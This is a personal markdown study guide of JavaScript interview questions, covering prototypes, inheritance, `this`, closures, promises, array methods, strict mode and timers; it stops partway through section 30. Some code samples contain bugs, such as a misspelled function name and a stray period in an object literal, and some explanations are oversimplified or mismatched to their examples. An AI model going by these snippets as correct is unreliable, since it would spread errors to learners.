--Reference from:

* https://medium.com/javascript-scene/10-interview-questions-every-javascript-developer-should-know-6fa6bdf5ad95#.gh7cuu59z
* https://github.com/nishant8BITS/123-Essential-JavaScript-Interview-Question
* http://ejohn.org/apps/learn/
* http://eloquentjavascript.net/

<!-- MarkdownTOC -->

- 1.1 Name two programming paradigms important for JavaScript app developers?
- 1.2 Functional Progamming in JavaScript
- 2. OOP in javascript
- 3.1 What is the difference between classical inheritance and prototypal inheritance?
- 3.2 When is classical inheritance an appropriate choice?
- 4 When is prototypal inheritance an appropriate choice? \(whenever you need inheritance\)
- 5. Use of 'prototype' vs. 'this' in JavaScript?
- 6. What are the pros and cons of functional programming vs object-oriented programming?
  - OOP
  - Functional Programming
- 7. What does “favor object composition over class inheritance” mean?
- 8. What are two-way data binding and one-way data flow, and how are they different?
- 9. What are the pros and cons of monolithic vs microservice architectures?
  - Monolithic
  - Micro Service
- 10. What is asynchronous programming, and why is it important in JavaScript?
- 11.1 Concurrency model and Event Loop in Javascript
  - Eventloop
  - Non-blocking I/O
- 11.2 Trick to eliminate stackoverflow on loop function
- 12.1 null vs. undefined
- 12.2 Difference between undefined and not defined in JavaScript
- 12.3 Best way to detect undefined object property in JavaScript
- 13.1 Difference between Function, Method and Constructor calls in JavaScript? \(OOP concept\)
- 13.2 Differences between function Person\(\){}, var person = Person\(\), and var person = new Person\(\)?
- 13.3 Function Declarations vs. Function Expressions
- 13.4 What is Context?
- 14. What is the difference between “==” and “===”?
- 15. What is the drawback of creating true private in JavaScript? -- NOT RECOMMENDED
- 17. Explain **delete** operator and what it does
- 18. What is JavaScript Self-Invoking anonymous function or Self-Executing anonymous function.
- 19.1 What is the difference between array vs. object?
  - Object / Associative Array
  - Array
- 19.2 How to check if an object is an array or not?
- 19.3 What are the way by which we can create object in JavaScript? - 3 ways
  - \(1\) Function Based
  - \(2\) Object Literal
  - \(3\) Using JavaScript "new" keyword \(constructor way\)
- 19.4 How to empty an array in JavaScript? -- 4 methods
- 21. What is "this" in JS?
- 22. What are differences between host object and native object?
  - Native object
  - Host object
  - User object
- 23. Why extending build in JavaScript object is a bad idea?
- 24.1 Why does nearly every object have a toString method?
- 24.2 what's different between Object.prototype.toString.call and typeof?
- 24.3 Difference between Object.prototype.toString.call\(arrayObj\) and arrayObj.toString\(\)
- 25.1 How would you apply asynchronous call without any help of library?
- 25.2 Pure JS Promise -- Write async function in JS \(This is my interview question at Yahoo\)
- 25.3 Promise.all and Promise.race
- 26.1 What is the difference between slice, substr, substring?
- 26.2 What is differences between Array.slice\(\) and Array.splice\(\)?
- 26.3 Differences between array.map\(\), array.reduce\(\), array.filter\(\). Example for function chain call
- 27. What is the reason for wrapping the entire content of a JavaScript source file in a function block?
- 28. What are the benefits of including 'use strict' at the beginning of a JavaScript source file? -- Good practice
- 28. What is a closure in JS?
- 29. Javascript Timer -- Difference between setTimeout\(\) and setInterval\(\)?
  - setTimeout\(\)/clearTimeout\(\)
  - setInterval\(\)/clearInterval\(\)
- 30. Graceful Degradation vs. Progressive Enhancement?
- 31. How are errors gracefully handled in JavaScript?
- 32. How to handle cross domain request in JavaScript?
  - CORS \(Cross-Origin Resource Sharing\)
  - JSONP \(JavaScript Object Notation with Padding\)
  - SERVER-SIDE PROXY
- 33. Function declaration \(Defined at run time vs. defined at parse time\)
- 34. What is difference between private variable, public variable and static variable? How we achieve this in JS?
- 35. CommonJS vs. AMD
- 36. Function length and method overloading
- 37.1 What is malicious JS and its consequences?
    - Consequences:
- 37.2 What is XSS attack?
- 38. How to set delay time for autocomplete request? \(Apple Interview\)
- 39. HashTable in JS
- 40. Writing shim for Object.keys\(\) function
- 41. What is the difference between declaring methods on the prototype level or in the constructor?
- 42. Checking idle time on browser
- 43. Javascript performance testing
- 44. Parsing XML DOM
- 45. What is hoisting in JS
- 46. Is JavaScript a pass-by-reference or pass-by-value language?
- 47. What could cause JS memory leak?
- 48. Detect when image fails to load in Javascript

<!-- /MarkdownTOC -->

#### 1.1 Name two programming paradigms important for JavaScript app developers?

* OOP programming -- Prototypal inheritance (also: prototypes, OLOO).
* Functional programming (also: closures, first class functions, lambdas).

**7 Types that used in JS**
* String
* Number
* Boolean
* Function
* Object
* Null
* Undefined

Eg: What is a potential pitfall with using typeof bar === "object" to determine if bar is an object? How can this pitfall be avoided?

```javascript
var bar = null;
console.log(typeof bar === "object");  // logs true! ==> null is a special object

/** correct way **/
console.log((bar !== null) && (typeof bar === "object"));  // logs false

```

#### 1.2 Functional Progamming in JavaScript

* Pure functions / function purity.
* Avoid side-effects.
* Simple function composition.
* Feature support Functional programming: first-class functions, higher order functions, functions as arguments/values.

#### 2. OOP in javascript
Read: http://javascriptissexy.com/oop-in-javascript-what-you-need-to-know/

* **Inheritance** -- objects can inherit features from other objects
* **Polymorphism** -- objects can share the same interface—how they are accessed and used—while their underlying implementation of the interface may differ)
* **Encapsulation** -- each object is responsible for specific tasks.

==> The two important principles with OOP in JavaScript are Object Creation patterns **(Encapsulation)** and Code Reuse patterns **(Inheritance)**.

* Encapsulation - mixture of constructor/prototype pattern for DRY
```javascript
function User (theName, theEmail) {
    this.name = theName;
    this.email = theEmail;
    this.quizScores = [];
    this.currentScore = 0;
}
​
User.prototype = {
    constructor: User,
    saveScore:function (theScoreToAdd) {
        this.quizScores.push(theScoreToAdd)
    },
    showNameAndScores:function ()  {
        var scores = this.quizScores.length > 0 ? this.quizScores.join(",") : "No Scores Yet";
        return this.name + " Scores: " + scores;
    },
    changeEmail:function (newEmail)  {
        this.email = newEmail;
        return "New Email Saved: " + this.email;
    }
}
```

* Inheritance - Object.create()
```javascript
function inheritPrototype(childObject, parentObject) {
    // As discussed above, we use the Crockford’s method to copy the properties and methods from the parentObject onto the childObject​
​    // So the copyOfParent object now has everything the parentObject has ​
    var copyOfParent = Object.create(parentObject.prototype);
​
    //Then we set the constructor of this new object to point to the childObject.​
    copyOfParent.constructor = childObject;
​
    //Then we set the childObject prototype to copyOfParent, so that the childObject can in turn inherit everything from copyOfParent (from parentObject)​
    childObject.prototype = copyOfParent;
}
```

#### 3.1 What is the difference between classical inheritance and prototypal inheritance?

First of, interesting comparison

| Java           | JavaScript    |
| -------------- |:-------------:|
| Strongly-typed | Loosely-typed |
| Static         | Dynamic       |
| Classical      | Prototypal    |
| Classes        | Functions     |
| Constructors   | Functions     |
| Methods        | Functions     |

**Classical Inheritance**

* instances inherit from classes
* it has tight coupling, hierarchy / or taxonomy
* Can be referenced from: http://www.crockford.com/javascript/inheritance.html

```javascript
//Initial Parenizor class
function Parenizor(value) {
    this.setValue(value);
}
Parenizor.method('setValue', function (value) {
    this.value = value;
    return this;
});
Parenizor.method('getValue', function () {
    return this.value;
});
Parenizor.method('toString', function () {
    return '(' + this.getValue() + ')';
});

//Now create ZParenizor class, which inherits from Parenizor
function ZParenizor(value) {
    this.setValue(value);
}

ZParenizor.inherits(Parenizor);

//Overwrite toString() method of a parent class
ZParenizor.method('toString', function () {
    if (this.getValue()) {
        return this.uber('toString');
    }
    return "-0-";
});

```

**Prototypal Inheritance**

* instances inherit directly from other objects.
* instantiated via factory functions or **Object.create()**, make used of **Object.getPrototypeOf**
* instance can be composed from many different objects, allowing for easy selective inheritance.

```javascript
function A(a){
  this.varA = a;
}

A.prototype = {
  varA : ...
  doSomething : function(){
    ...
  }
};
//Create B, which inherit from base class A
function B(a, b) {
  A.call(this, a);
  this.varB = b;
}
B.prototype = Object.create(A.prototype, {
  varB : ...
  doSomething : {
    value: function() { // override
      ...
    },
    ...
  }
});
B.prototype.constructor = B;

var b = new B();
b.doSomething();
```

#### 3.2 When is classical inheritance an appropriate choice?

Boo, the answer is rarely, almost never. “Favor object composition over class inheritance.”

#### 4 When is prototypal inheritance an appropriate choice? (whenever you need inheritance)
Useful for:
* Delegation (i.e., the prototype chain).
* Concatenative (i.e. mixins, `Object.assign()`).
* Functional (Not to be confused with functional programming. A function used to create a closure for private state/encapsulation).

#### 5. Use of 'prototype' vs. 'this' in JavaScript?
http://stackoverflow.com/questions/310870/use-of-prototype-vs-this-in-javascript

```javascript
//Note: Method invocations are very slightly faster for this one
var A = function () {
    this.x = function () {
        //do something
    };
};

/******** vs. *********/

var A = function () { };
A.prototype.x = function () {
    //do something
};

```

Prototype pattern is good for
* Faster to create instances (jsperf)
* Uses less memory

#### 6. What are the pros and cons of functional programming vs object-oriented programming?

##### OOP

**Pros**
* Basic concept of objects, easy to interpret the meaning of method calls
* Imperative style rather than a declarative style, which reads like a straight-forward set of instructions for the computer to follow.

**Cons**
* OOP Typically depends on shared state.
* Objects and behaviors are typically tacked together on the same entity, which may be accessed at random by any number of functions with non-deterministic order, which may lead to undesirable behavior such as race conditions.

##### Functional Programming

**Pros**
* avoid any shared state or side-effects, which eliminates bugs caused by multiple functions competing for the same resources.
* easy to scale across multiple processors, or across distributed computing clusters

**Cons**
* Steeper learning curve

#### 7. What does “favor object composition over class inheritance” mean?

use **can-do**, **has-a**, or **uses-a** relationships INSTEAD OF **is-a** relationships.

* Avoid class hierarchies.
* Avoid brittle base class problem.
* Avoid tight coupling.
* Avoid rigid taxonomy (forced is-a relationships that are eventually wrong for new use cases).
* Make code more flexible.

#### 8. What are two-way data binding and one-way data flow, and how are they different?

*One way data flows are deterministic, whereas two-way binding can cause side-effects which are harder to follow and understand.*

**Two-way data binding**

* UI fields are bound to model data dynamically such that when a UI field changes, the model data changes with it and vice-versa.
* *Eg*: AngularJS

**One-way data flow**

* Model is the single source of truth. Changes in the UI trigger messages that signal user intent to the model
* Only the model has the access to change the app’s state.
* The effect is that data always flows in a single direction, which makes it easier to understand.
* *Eg*: ReactJs

#### 9. What are the pros and cons of monolithic vs microservice architectures?

#####Monolithic

App is written as one cohesive unit of code whose components are designed to work together, sharing the same memory space and resources.

**Pros**
* Cross-cutting concerns: logging, rate limiting, and security features such audit trails and DOS protection.
* Easy to hook up on the same app level
* Can be performance advantages, since shared-memory access is faster than inter-process communication (IPC).

**Cons**
* Tightly couple
* Dedependecies, side-effects

#####Micro Service

App is made up of lots of smaller, independent applications capable of running in their own memory space and scaling independently from each other across potentially many separate machines.

**Pros**
* Better organized, decoupled services, easy to re-compose or re-configured
* Better performance, able to isolate hot services, scale them independently

**Cons**
* Incur the overhead of separate module
* Higher cost for operation

#### 10. What is asynchronous programming, and why is it important in JavaScript?

**Synchrounous**
* Barring conditionals and function calls, code is executed sequentially from top-to-bottom, blocking on long-running tasks such as network requests and disk I/O.

**Asynchrounous**
* Engine runs in an event loop.
* When a blocking operation is needed, the request is started, and the code keeps running without blocking for the result.
* When the response is ready, an interrupt is fired, which causes an event handler to be run, where the control flow continues.
* A single program thread can handle many concurrent operations.


#### 11.1 Concurrency model and Event Loop in Javascript
Read: https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop

* JavaScript has a concurrency model based on an "event loop"

**Runtime conception:**

* stack: Function calls form a stack of frames.
* heap: Objects are allocated in a heap which is just a name to denote a large mostly unstructured region of memory.
* queue: A JavaScript runtime contains a message queue, which is a list of messages to be processed. When the stack is empty, a message is taken out of the queue and processed. The processing consists of calling the associated function (and thus creating an initial stack frame). The message processing ends when the stack becomes empty again

##### Eventloop
* Each message is processed completely before any other message is processed
* messages are added any time an event occurs and there is an event listener attached to it. If there is no listener, the event is lost
* execution depends on the number of awaiting tasks in the queue
* A web worker or a cross-origin iframe has its own stack, heap, and message queue. Two distinct runtimes can only communicate through sending messages via the postMessage method

```
while(queue.waitForMessage()){
  queue.processNextMessage();
}
```

##### Non-blocking I/O
* Handling I/O is typically performed via events and callbacks, so when the application is waiting for an IndexedDB query to return or an XHR request to return, it can still process other things like user input.

#### 11.2 Trick to eliminate stackoverflow on loop function

```javascript
var list = readHugeList();

var nextListItem = function() {
    var item = list.pop();

    if (item) {
        // process the list item...
        //If we don't have setTimeout yet just call nextListItem(), stackoverflow might happen
        //callstack need to remain clear ==> so use event loop concept here
        setTimeout( nextListItem, 0);
    }
};
```
* The stack overflow is eliminated because the **event loop** handles the recursion, not the call stack.
* When nextListItem runs, if item is not null, the timeout function (nextListItem) is pushed to the event queue and the function exits, thereby leaving the call stack clear.
* When the event queue runs its timed-out event, the next item is processed and a timer is set to again invoke nextListItem.
* Accordingly, the method is processed from start to finish **without a direct recursive call**, so the call stack remains clear, regardless of the number of iterations.

#### 12.1 null vs. undefined

**undefined** -- value of the variable is not defined, undefined is a type. Assigning a new value to it does not change the value of the type undefined.

**null** -- means empty or non-existent value ("no-value"), primitive value & can assign null to any variable. null is NOT object, but primitive value, typeof null is object though

#### 12.2 Difference between undefined and not defined in JavaScript

* In JavaScript if you try to use a variable that doesn't exist and has not been declared, then JavaScript will throw an error var name is not defined and the script will STOP execute thereafter. But If you use typeof undeclared_variable then it will return undefined.

```javascript
var x; // declaring x
console.log(x); //output: undefined

var x; // Declaration
if(typeof x === 'undefined') // Will return true

console.log(y);  // Output: ReferenceError: y is not defined

```

#### 12.3 Best way to detect undefined object property in JavaScript
* could use **typeof()** operator

```javascript
if(typeof someProperty === 'undefined'){
    console.log('something is undefined here');
}
```

* **instanceof** operator checks the current object and return true if the object is of the specified type.

```javascript
//Example1:
var dog = new Animal();
dog instanceof Animal; // Output : true

//Example2:
function foo() {
  return foo;
}
new foo() instanceof foo; //==> false

```

#### 13.1 Difference between Function, Method and Constructor calls in JavaScript? (OOP concept)

**functions** -- not associated with object hence not invoked through any object.

```javascript
function helloWorld(name) {
    return "hello world, " + name;
}

helloWorld("JS Geeks"); // "hello world JS Geeks"
```

**method** -- object properties that reference to a function

```javascript
var obj = {
    helloWorld : function() {
      return "hello world, " + this.name;
    },
    name: 'John Carter'
}
obj.helloWorld(); // // "hello world John Carter"

//can copy a reference to the same function helloWorld in another object and get a difference answer
var obj2 = {
    helloWorld : obj.helloWorld,
    name: 'John Doe'
}
obj2.helloWorld(); // "hello world John Doe"
```

**constructors** -- defined with function, primary role is to define the object. Unlike function or method call, constructor call create brand new object and pass it as the value of this, implicitly returns **new object** as its result

```javascript
function Employee(name, age) {
    this.name = name;
    this.age = age;
}

var emp1 = new Employee('John Doe', 28);
emp1.name; // "John Doe"
emp1.age; // 28

```

#### 13.2 Differences between function Person(){}, var person = Person(), and var person = new Person()?

* Function declaration
* Function expression
* function constructors

#### 13.3 Function Declarations vs. Function Expressions

Read: https://javascriptweblog.wordpress.com/2010/07/06/function-declarations-vs-function-expressions/

**Function Declaration**
* defines a named function variable without requiring variable assignment
* standalone constructs and cannot be nested within non-function blocks.

```javascript
function bar() {
    return 3;
}
```
**Function Expressions**
* defines a function as a part of a larger expression syntax (typically a variable assignment ). Functions defined via Functions Expressions can be named or anonymous

```javascript
//anonymous function expression
var a = function() {
    return 3;
}

//named function expression
var a = function bar() {
    return 3;
}

//self invoking function expression
(function sayHello() {
    alert("hello!");
})();

```

#### 13.4 What is Context?

* Determined by how a function is invoked. When a function is called as a method of an object, **this** is set to the object the method is called on
* The below is how to change a context of function ==> using call()

```javascript
var object = {};
function fn(){
  return this;
}
assert( fn() == this, "The context is the global object." );
assert( fn.call(object) == object, "The context is changed to a specific object." );
```

#### 14. What is the difference between “==” and “===”?

**==** checks equality only,

**===** checks for equality as well as the type.

#### 15. What is the drawback of creating true private in JavaScript? -- NOT RECOMMENDED

* Memory inefficient because a new copy of the method would be created for each instance.
* Should NOT use private method unless it's really necessary
* Example of private vs. public method

```javascript
var Employee = function (name, company, salary) {
  this.name = name || "";       //Public attribute default value is null
  this.company = company || ""; //Public attribute default value is null
  this.salary = salary || 5000; //Public attribute default value is null

  // Private method
  var increaseSalary = function () {
    this.salary = this.salary + 1000;
  };

  // Public method
  this.displayIncreasedSalary = function() {
    increaseSlary();
    console.log(this.salary);
  };
};

// Create Employee class object
var emp1 = new Employee("John","Pluto",3000);
// Create Employee class object
var emp2 = new Employee("Merry","Pluto",2000);
// Create Employee class object
var emp3 = new Employee("Ren","Pluto",2500);

//Result: Here each instance variable emp1, emp2, emp3 has own copy of increaseSalary private method.

```

#### 17. Explain **delete** operator and what it does

* delete operator is used to delete a property from an object
* delete operator DOES NOT affect local/or global variable
* delete operator DOSE NOT delete prototype property.

==> often has **unexpected behaviour** and can only be safely used to delete explicitly set properties on normal objects.

DOES NOT delete local variable

```javascript
var output = (function(x) {
  delete x;
  return x;
})(0);

console.log(output); //Output: 0
```

DOES NOT delete local variable

```javascript
var x = 1;
var output = (function() {
  delete x;
  return x;
})();

console.log(output); //Output: 1
```

DELETE property from object

```javascript
var x = { foo : 1};
var output = (function() {
  delete x.foo;
  return x.foo;
})();

console.log(output); //Output: undefined
```

DOES NOT delete prototype property

```javascript
var Employee = {
  company: 'xyz'
};
var emp1 = Object.create(Employee); //emp1 object doesn't have company as its own property
delete emp1.company;
console.log(emp1.company); //Output: 'xyz'

```

#### 18. What is JavaScript Self-Invoking anonymous function or Self-Executing anonymous function.
(notice: these 2 names are meant for the same thing!!!)

* Runs immediately/automatically when we define it and self-invoking anonymous function doesn't have any name at all.

```javascript
// Named Self-invoking Function
(function myFunc() {
  // Do some stuff;
})();

// Anonymous Self-invoking Function
(function() {
  // Do some stuff;
})();
```

#### 19.1 What is the difference between array vs. object?

* Read: http://nfriedly.com/techblog/2009/06/advanced-javascript-objects-arrays-and-array-like-objects/

##### Object / Associative Array

```javascript
var fancyObj = {
    favoriteFood: "pizza",
    add: function(a, b){
        return a + b;
    }
};

fancyObj.add(2,3); // returns 5

//Example for associated array in JS
fancyObj['add'](2,3); // ditto.

```

* Everything in javascript is an object. Everything. Arrays, functions, even numbers! Because of this, you can do some really interesting things, such as modifying the prototypes of Objects, Arrays, etc.

```javascript
Number.prototype.addto = function(x){
    return this + x;
}

(8).addto(9); // returns 17

// other variations:

8.addto(9);  // gives a syntax error, because the dot is assumed to be a decimal point

8['addto'](9);  // works but is kind of ugly compared to the first method

var eight = 8;
eight.addto(9);  // works

```

##### Array
* Type of object used for storing multiple values in a single variable. Each value gets **numeric index** and may be any data type
* **length** property ==> how many items are in the array, automatically updated when add/remove items to the array.
* Can use the following functions: push(), pop(), sort(), slice(), splice(), ...

#### 19.2 How to check if an object is an array or not?

* The best way to find whether an object is instance of a particular class or not using **toString** method from Object.prototype
```javascript
if(Object.prototype.toString.call(arrayList) === '[object Array]') {
    console.log('Array!');
}
```
With mordern browser, **Array.isArray()** method can also be used

#### 19.3 What are the way by which we can create object in JavaScript? - 3 ways

##### (1) Function Based
```javascript
function Employee(fName, lName, age, salary) {
    this.firstName = fName;
    this.lastName = lName;
    this.age = age;
    this.salary = salary;
}

// Creating multiple object which have similar property but diff value assigned to object property.
var employee1 = new Employee('John', 'Moto', 24, '5000$');
var employee2 = new Employee('Ryan', 'Jor', 26, '3000$');

```

##### (2) Object Literal
* Object Literal is best way to create an object and this is used frequently.

```javascript
var employee = {
    name : 'Nishant',
    salary : 245678,
    getName : function(){
        return this.name;
    }
}
//or nested object
var employee = {
    name : 'Nishant',
    salary : 245678,
    address : {
        addressLine1 : 'BITS Pilani',
        addressLine2 : 'Vidya Vihar'.
        phoneNumber: {
          workPhone: 7098889765,
          homePhone: 1234567898
        }
    }
}
```

##### (3) Using JavaScript "new" keyword (constructor way)

```javscript
var employee = new Object(); // Created employee object using new keywords and Object()
employee.name = 'Nishant';
employee.getName = function(){
    return this.name;
}
```

#### 19.4 How to empty an array in JavaScript? -- 4 methods

* (1)

```javascript
arrayList = [];
//only use this if you have only referenced the array by its original variable arrayList
//otherwise, the original array will remain unchanged
```
* (2)

```javascript
arrayList.length = 0;
//clear all references and set length to 0
//useful when you want to update all the another reference variable which pointing to arrayList.
```

* (3)

```javascript
arrayList.splice(0, arrayList.length);
//update all the references
```

* (4) ==> loop through array to remove elements (NOT RECOMMENDED)

```javascript
while(arrayList.length) {
  arrayList.pop();
}
```

#### 21. What is "this" in JS?

At the time of execution of function, JavaScript engine sets a property to the function called "this" which refer to the current execution context. this is **always** refer to an object and depends on how function is called.

* In the global context or inside a function this refers to the window object.
* Inside IIFE (immediate invoking function) if you use "use strict", value of this is undefined. To pass access window inside IIFE with "use strict", you have to pass this.
* While executing a function in the context of an object, the object becomes the value of this
* Inside a setTimeout function, the value of this is the window object.
* If you use a constructor (by using new keyword) to create an object, the value of this will refer to the newly created object.
* You can set the value of this to any arbitrary object by passing the object as the first parameter of bind, call or apply
* For dom event handler, value of this would be the element that fired the event

```javascript
var User = {
  count: 1,

  getCount: function() {
    return this.count;
  }
};

console.log(User.getCount()); //Answer: 1

/// BUT!
var func = User.getCount;
console.log(func()); //Answer: undefined

//To get a correct answer, use function.bind method as following
var func = User.getCount.bind(User);
console.log(func());
```

#### 22. What are differences between host object and native object?

##### Native object

* core predefined objects always available in JavaScript. Defined in the ECMAScript spec.
* Eg: Object (constructor), Date, Math, parseInt, eval, string methods like indexOf and replace, array methods, ...

##### Host object

* provided by the browser environment.
* Eg: window, document, location, history, XMLHttpRequest, setTimeout, getElementsByTagName, querySelectorAll

##### User object

* objects defined in JavaScript code

#### 23. Why extending build in JavaScript object is a bad idea?
Read: http://programmers.stackexchange.com/questions/104320/why-is-extending-the-dom-built-in-object-prototypes-a-bad-idea
* Lack of specification
* Host objects have no rules
* Chance of collisions
* Performance overhead (manual extension in older browser, slow, inconvenient & don't scale)
* IE is really bad!

#### 24.1 Why does nearly every object have a toString method?

Most inherited from Object.prototype or define it on its own (or inherit it from their custom prototype). ==> inherit toString() method from the interface/parent

#### 24.2 what's different between Object.prototype.toString.call and typeof?

* toString() is a method, that returns a string that represents the current object (ex: Function), can override it to return anything you want.

* typeof is an operator. You use it to get the type of object (as a string), CANNOT change (overloading) it like some other languages.

```javascript
typeof(new Array())  === "object";
typeof(new Date())   === "object";
typeof(new RegExp()) === "object";

Object.prototype.toString.call(new Array()).slice(8, -1)  === "Array";
Object.prototype.toString.call(new Date()).slice(8, -1)   === "Date";
Object.prototype.toString.call(new RegExp()).slice(8, -1) === "RegExp";
```

#### 24.3 Difference between Object.prototype.toString.call(arrayObj) and arrayObj.toString()

```javascript
var toString = Object.prototype.toString;

"foo".toString(); // "foo"
toString.call("foo"); // [object String]

[].toString(); // ""
toString.call([]); // [object Array]

{}.toString(); // syntax error
toString.call({}); // [object Object]
```

When the toString method is called, the following steps are taken:
* Let O be the result of calling ToObject passing the this value as the argument.
* Let class be the value of the [[Class]] internal property of O.
* Return the String value that is the result of concatenating the three Strings "[object ", class, and "]".


#### 25.1 How would you apply asynchronous call without any help of library?
Read: http://krasimirtsonev.com/blog/article/7-lines-JavaScript-library-for-calling-asynchronous-functions

```javascript
var queue = function(funcs, scope) {
    (function next() {
        if(funcs.length > 0) {
            funcs.shift().apply(scope || {}, [next].concat(Array.prototype.slice.call(arguments, 0)));
        }
    })();
};
var obj = {
    value: null
};
queue([
    function(callback) {
        var self = this;
        setTimeout(function() {
            self.value = 10;
            callback(20);
        }, 200);
    },
    function(callback, add) {
        console.log(this.value + add);
        callback();
    },
    function() {
        console.log(obj.value);
    }
], obj);
```

#### 25.2 Pure JS Promise -- Write async function in JS (This is my interview question at Yahoo)
Read:
* https://ponyfoo.com/articles/understanding-javascript-async-await
* https://ponyfoo.com/articles/es6-promises-in-depth

```javascript
var remoteData = {'test': 'hi'};
var getData = function () {
    return new Promise(function (resolve, reject) {
      resolve(remoteData);
   });
}

getData().then(function(data) {
    alert(data);
});

//Using ES6 arrow function
getData().then(data => alert(data));
```

* Creating Promise from scratch, using ES6 arrow function. Note: only the first call made to either of these methods will have an impact – once a promise is settled, it’s result can’t change.
```javascript
new Promise(resolve => resolve()) // promise is fulfilled
new Promise((resolve, reject) => reject()) // promise is rejected

```

```javascript
//a promise that’s fulfilled in the alloted time or rejected after a generous timeout
function resolveUnderThreeSeconds (delay) {
  return new Promise(function (resolve, reject) {
    setTimeout(resolve, delay)
    setTimeout(reject, 3000)
  })
}
resolveUnderThreeSeconds(2000) // resolves!
resolveUnderThreeSeconds(7000) // fulfillment took so long, it was rejected.

```

#### 25.3 Promise.all and Promise.race


#### 26.1 What is the difference between slice, substr, substring?

NON OF THEM MUTATES

* String.slice( begin [, end ] ) ==> result of substring will NOT contain character at final index
* String.substring( from [, to ] ) ==> result of substring will NOT contain character at final index
* String.substr( start [, length ] )

#### 26.2 What is differences between Array.slice() and Array.splice()?
Read: http://ariya.ofilabs.com/2014/02/javascript-array-slice-vs-splice.html

**slice()** -- return a new array containing the elements from the given start index up the one right before the specified end index, DOES NOT CHANGE the array which invokes it

```javascript
'abc'.slice(1,2)           // "b"
[14, 3, 77].slice(1, 2)    //  [3]
```

**splice()** -- MUTATES the array that calls it.

```javascript
var x = [14, 3, 77]
var y = x.splice(1, 2)
console.log(x)           // [14]
console.log(y)           // [3, 77]
```

#### 26.3 Differences between array.map(), array.reduce(), array.filter(). Example for function chain call

Read: http://cryto.net/~joepie91/blog/2015/05/04/functional-programming-in-javascript-map-filter-reduce/

* **array.map**
forEach() loop transforming the array, NOT mutate, and don't cause side effects (only modify new array, original array not affected)
```javascript
var numbers = [1, 2, 3, 4];

var newNumbers = numbers.map(function(number){
    return number * 2;
}).map(function(number){
    return number + 1;
});

console.log("The doubled and incremented numbers are", newNumbers); // [3, 5, 7, 9]
```

* **array.filter()**
Manipulate some value in array, the callback function in filter() should return boolean value, NOT mutate, and not cause side-effects

```javascript
var numbers = [1, 2, 3, 4];

var newNumbers = numbers.filter(function(number){
    return (number % 2 !== 0);
}).map(function(number){
    return number * 2;
});

console.log("The doubled numbers are", newNumbers); // [2, 6]
```

* **array.reduce()**
mostly for combining value in the array. Or adding certain value in array (eg: adding extra even number in array)
```javascript
var numbers = [1, 2, 3, 4];

var totalNumber = numbers.map(function(number){
    return number * 2;
}).reduce(function(total, number){
    return total + number;
}, 0);

console.log("The total number is", totalNumber); // 20
```

```javascript
//Walk through array, and add "even" value follow right after even value in array
var numbers = [1, 2, 3, 4];

var newNumbers = numbers.reduce(function(newArray, number){
    newArray.push(number);

    if(number % 2 == 0) {
        /* Add it a second time. */
        newArray.push(number);
    }

    return newArray; /* This is important! */
}, []);

console.log("The final numbers are", newNumbers); // [1, 2, 2, 3, 4, 4]
```

#### 27. What is the reason for wrapping the entire content of a JavaScript source file in a function block?
* Creates a private namespace and thereby helps avoid potential name clashes between different JavaScript modules and libraries.

#### 28. What are the benefits of including 'use strict' at the beginning of a JavaScript source file? -- Good practice

Enforce stricter parsing and error handling on your JavaScript code at runtime. Code errors that would otherwise have been ignored or would have failed silently will now generate errors or throw exceptions.

**Makes debugging easier.** -- Code errors that would otherwise have been ignored or would have failed silently will now generate errors or throw exceptions, alerting you sooner to problems in your code and directing you more quickly to their source.

**Prevents accidental globals** -- Without strict mode, assigning a value to an undeclared variable automatically creates a global variable with that name. In strict mode, attempting to do so throws an error.

**Eliminates this coercion.** -- Without strict mode, a reference to a this value of null or undefined is automatically coerced to the global. This can cause many headfakes and pull-out-your-hair kind of bugs. In strict mode, referencing a a this value of null or undefined throws an error.

**Disallows duplicate property names or parameter values.** -- Strict mode throws an error when it detects a duplicate named property in an object (e.g., var object = {foo: "bar", foo: "baz"};) or a duplicate named argument for a function (e.g., function foo(val1, val2, val1){}), thereby catching what is almost certainly a bug in your code that you might otherwise have wasted lots of time tracking down.

**Makes eval() safer.** -- There are some differences in the way eval() behaves in strict mode and in non-strict mode. Most significantly, in strict mode, variables and functions declared inside of an eval() statement are not created in the containing scope (they are created in the containing scope in non-strict mode, which can also be a common source of problems).

**Throws error on invalid usage of delete.** -- The delete operator (used to remove properties from objects) cannot be used on non-configurable properties of the object. Non-strict code will fail silently when an attempt is made to delete a non-configurable property, whereas strict mode will throw an error in such a case.

#### 28. What is a closure in JS?
* function defined inside another function (called parent function) and has access to the variable which is declared and defined in parent function scope. (Inner function vs. outer function)

**The closure has access to variable in three scopes:**
* Variable declared in his own scope
* Variable declared in parent function scope
* Variable declared in global namespace

```javascript
var obj1 = {
   printThis: function() {
      console.log(this);
   }
};

var func1 = obj1.printThis;
obj1.printThis(); //line 1 ==> print out obj1
func1(); //line 2 ==> print out window
```

#### 29. Javascript Timer -- Difference between setTimeout() and setInterval()?

Referenced from:
https://web.archive.org/web/20130101080638/http://bonsaiden.github.com/JavaScript-Garden/

* A string should **NEVER** be used as the parameter of setTimeout or setInterval (evil "eval)
* An anonymous function should be passed that then takes care of the actual call.
* **setInterval** should be avoided because its scheduler is not blocked by executing JavaScript.
* Timers can be tricky to use since they operate within a single thread, the events queue up waiting to execute.  Multiple setTimeouts firing around the same time, you cannot guarantee sequential execution.

##### setTimeout()/clearTimeout()
==> executes a function, once, after waiting a specified number of milliseconds

* Execute only ONCE
* Depending on the timer resolution of the JS engine running the code, as well as the fact that JavaScript is single threaded and other code that gets executed might block the thread, it is by **no means a safe bet** that one will get the exact delay specified in the setTimeout call.
* The function that was passed as the first parameter will get called by the global object, which means that this inside the called function refers to the global object.
* setTimeout(foo(), 1000) ==> Should be "foo" only, silent error, since when the function returns undefined setTimeout will not raise any error.

Eg:
```javascript
function Foo() {
    this.value = 42;
    this.method = function() {
        // this refers to the global object
        console.log(this.value); // will log undefined
    };
    setTimeout(this.method, 500);
}
new Foo();
```

##### setInterval()/clearInterval()
==> executes a function, over and over again, at specified time intervals

* Different from setTimeout, it will execute the function every X milliseconds, but its use is discouraged.
* With small time interval, setInterval() might result in function calls stacking up.

```javascript
function foo() {
    // something that blocks for 1 second
}
setInterval(foo, 1000);

//foo will get called once and will then block for one second.
//While foo blocks the code, setInterval will still schedule further calls to it.
//Now, when foo has finished, there will already be ten further calls to it waiting for execution.

```
* To prevent function stacking up, the closet solution is to use setTimeout()
```javascript
function foo(){
    // something that blocks for 1 second
    setTimeout(foo, 1000);
}
foo();
```

#### 30. Graceful Degradation vs. Progressive Enhancement?

**Graceful Degradation**
